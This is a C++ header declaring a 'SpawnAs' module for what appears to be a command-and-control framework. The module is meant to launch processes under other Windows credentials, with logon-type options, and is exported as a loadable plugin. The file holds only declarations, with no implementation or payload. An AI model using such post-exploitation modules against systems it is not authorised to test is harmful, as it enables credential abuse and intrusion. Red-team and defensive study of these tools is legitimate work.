#pragma once

#include "ModuleCmd.hpp"

#ifndef _WIN32
constexpr int LOGON32_LOGON_INTERACTIVE = 2;
constexpr int LOGON32_LOGON_NEW_CREDENTIALS = 9;
#endif


class SpawnAs : public ModuleCmd
{

public:
    SpawnAs();
    ~SpawnAs();

    std::string getInfo();

    int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
    int process(C2Message& c2Message, C2Message& c2RetMessage);
    int osCompatibility()
    {
        return OS_WINDOWS;
    }

    int errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg) override;

private:

    struct Options
    {
        int logonType = LOGON32_LOGON_INTERACTIVE;
        bool loadProfile = true;
        bool showWindow = false;
    };

    std::string packParameters(const Options& options) const;
    Options unpackParameters(const std::string& data) const;

};


#ifdef _WIN32

extern "C" __declspec(dllexport) SpawnAs * A_SpawnAsConstructor();

#else

extern "C"  __attribute__((visibility("default"))) SpawnAs * SpawnAsConstructor();

#endif
